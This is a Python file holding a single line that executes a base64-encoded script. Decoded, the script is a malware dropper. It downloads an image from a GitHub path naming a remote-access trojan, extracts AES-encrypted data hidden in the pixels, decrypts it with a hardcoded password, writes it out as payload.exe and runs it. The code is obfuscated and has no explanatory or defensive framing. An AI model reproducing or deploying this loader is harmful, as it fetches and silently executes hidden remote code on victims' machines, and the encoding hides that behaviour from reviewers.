import base64,sys;exec(base64.b64decode({2:str, 3:lambda b:bytes(b, 'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHVybGxpYg0KaW1wb3J0IGhhc2hsaWINCmltcG9ydCBzdHJ1Y3QNCmltcG9ydCBzdWJwcm9jZXNzDQppbXBvcnQgb3MNCmZyb20gQ3J5cHRvIGltcG9ydCBSYW5kb20NCmZyb20gQ3J5cHRvLkNpcGhlciBpbXBvcnQgQUVTDQpmcm9tIFBJTCBpbXBvcnQgSW1hZ2UNCg0KDQpjbGFzcyBBRVNDaXBoZXI6DQogICAgZGVmIF9faW5pdF9fKHNlbGYsIGtleSk6DQogICAgICAgIHNlbGYuYnMgPSAzMg0KICAgICAgICBzZWxmLmtleSA9IGhhc2hsaWIuc2hhMjU2KGtleS5lbmNvZGUoKSkuZGlnZXN0KCkNCg0KICAgIGRlZiBlbmNyeXB0KHNlbGYsIHJhdyk6DQogICAgICAgIHJhdyA9IHNlbGYuX3BhZChyYXcpDQogICAgICAgIGl2ID0gUmFuZG9tLm5ldygpLnJlYWQoQUVTLmJsb2NrX3NpemUpDQogICAgICAgIGNpcGhlciA9IEFFUy5uZXcoc2VsZi5rZXksIEFFUy5NT0RFX0NCQywgaXYpDQogICAgICAgIHJldHVybiBpdiArIGNpcGhlci5lbmNyeXB0KHJhdykNCg0KICAgIGRlZiBkZWNyeXB0KHNlbGYsIGVuYyk6DQogICAgICAgIGl2ID0gZW5jWzpBRVMuYmxvY2tfc2l6ZV0NCiAgICAgICAgY2lwaGVyID0gQUVTLm5ldyhzZWxmLmtleSwgQUVTLk1PREVfQ0JDLCBpdikNCiAgICAgICAgcmV0dXJuIHNlbGYuX3VucGFkKGNpcGhlci5kZWNyeXB0KGVuY1tBRVMuYmxvY2tfc2l6ZTpdKSkNCg0KICAgIGRlZiBfcGFkKHNlbGYsIHMpOg0KICAgICAgICByZXR1cm4gcyArIChzZWxmLmJzIC0gbGVuKHMpICUgc2VsZi5icykgKiBjaHIoc2VsZi5icyAtIGxlbihzKSAlIHNlbGYuYnMpDQoNCiAgICBAc3RhdGljbWV0aG9kDQogICAgZGVmIF91bnBhZChzKToNCiAgICAgICAgcmV0dXJuIHNbOi1vcmQoc1tsZW4ocykgLSAxOl0pXQ0KDQoNCmRlZiBnZXRfcGF5bG9hZCgpOg0KICAgIHJldHVybiB1cmxsaWIudXJscmV0cmlldmUoImh0dHBzOi8vZ2l0aHViLmNvbS9leHBlcnRzZWN1cml0ZWRpZ2l0YWxlL0VTRDE0L3RyZWUvdGhpYmF1bHQvUkFUX3NlY29uZF90cnkiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJwYXlsb2FkLmpwZyIpDQoNCg0KZGVmIGFzc2VtYmxlKHYpOg0KICAgIGJ5dGVzID0gIiINCiAgICBsZW5ndGggPSBsZW4odikNCiAgICBmb3IgaWR4IGluIHJhbmdlKDAsIGxlbih2KS84KToNCiAgICAgICAgYnl0ZSA9IDANCiAgICAgICAgZm9yIGkgaW4gcmFuZ2UoMCwgOCk6DQogICAgICAgICAgICBpZiBpZHgqOCtpIDwgbGVuZ3RoOg0KICAgICAgICAgICAgICAgIGJ5dGUgPSAoYnl0ZSA8PCAxKSArIHZbaWR4KjgraV0NCiAgICAgICAgYnl0ZXMgPSBieXRlcyArIGNocihieXRlKQ0KDQogICAgcGF5bG9hZF9zaXplID0gc3RydWN0LnVucGFjaygiaSIsIGJ5dGVzWzo0XSlbMF0NCg0KICAgIHJldHVybiBieXRlc1s0OiBwYXlsb2FkX3NpemUgKyA0XQ0KDQoNCmRlZiBleHRyYWN0KGluX2ZpbGUsIG91dF9maWxlLCBwYXNzd29yZCk6DQogICAgaW1nID0gSW1hZ2Uub3Blbihpbl9maWxlKQ0KICAgICh3aWR0aCwgaGVpZ2h0KSA9IGltZy5zaXplDQogICAgY29udiA9IGltZy5jb252ZXJ0KCJSR0JBIikuZ2V0ZGF0YSgpDQoNCiAgICB2ID0gW10NCiAgICBmb3IgaCBpbiByYW5nZShoZWlnaHQpOg0KICAgICAgICBmb3IgdyBpbiByYW5nZSh3aWR0aCk6DQogICAgICAgICAgICAociwgZywgYiwgYSkgPSBjb252LmdldHBpeGVsKCh3LCBoKSkNCiAgICAgICAgICAgIHYuYXBwZW5kKHIgJiAxKQ0KICAgICAgICAgICAgdi5hcHBlbmQoZyAmIDEpDQogICAgICAgICAgICB2LmFwcGVuZChiICYgMSkNCg0KICAgIGRhdGFfb3V0ID0gYXNzZW1ibGUodikNCg0KICAgIGNpcGhlciA9IEFFU0NpcGhlcihwYXNzd29yZCkNCiAgICBkYXRhX2RlYyA9IGNpcGhlci5kZWNyeXB0KGRhdGFfb3V0KQ0KICAgIG91dF9mID0gb3BlbihvdXRfZmlsZSwgIndiIikNCiAgICBvdXRfZi53cml0ZShkYXRhX2RlYykNCiAgICBvdXRfZi5jbG9zZSgpDQoNCg0KZGVmIGV4ZWN1dGUocGF0aCk6DQogICAgc3VicHJvY2Vzcy5Qb3BlbihbcGF0aF0pDQoNCg0KZGVmIG1haW4oKToNCiAgICBwYXRoID0gb3MucGF0aC5kaXJuYW1lKG9zLnBhdGguYWJzcGF0aChfX2ZpbGVfXykpDQogICAgcGF5bG9hZF9wYXRoID0gcGF0aCsiL3BheWxvYWQuZXhlIg0KICAgIGV4dHJhY3QoZ2V0X3BheWxvYWQoKSwgcGF5bG9hZF9wYXRoLCAidG90byIpDQogICAgZXhlY3V0ZShwYXlsb2FkX3BhdGgpDQoNCg0KaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoNCiAgICBtYWluKCkNCg==')))